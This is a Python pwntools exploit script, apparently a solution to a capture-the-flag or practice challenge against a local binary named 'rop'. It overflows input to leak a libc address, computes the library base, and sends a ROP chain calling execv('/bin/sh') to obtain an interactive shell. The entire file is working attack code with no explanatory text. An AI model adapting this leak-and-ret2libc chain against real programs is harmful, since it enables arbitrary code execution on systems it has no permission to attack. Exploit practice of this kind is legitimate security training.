#!/usr/bin/python3
 
from pwn import *

vuln = ELF("./rop")
libc = ELF("/usr/lib/libc.so.6")

p = process("./rop")
context.binary = vuln

POP_RDI = 0xfd8c4
POP_RSI = 0xfec6b

p.recvline()

payload = 0x37*b"2" + b"\n"
p.send(payload)
p.recvline()
libc_leak = p.recvline(keepends=False)
libc.address = unpack(libc_leak, 'all') - 0x25c88
info(f"Libc @ {hex(libc.address)}")

payload = 0x28*b"A"

if False:
    rop = ROP(libc)
    rop(rdi=next(libc.search(b"/bin/sh")), rsi = 0)
    print(rop.dump())
    payload += rop.chain()
else:
    payload += p64(libc.address + POP_RDI)
    payload += p64(next(libc.search(b"/bin/sh")))
    payload += p64(libc.address + POP_RSI)
    payload += p64(0)
payload += p64(libc.symbols["execv"])
pause()
p.sendline(payload)


p.interactive()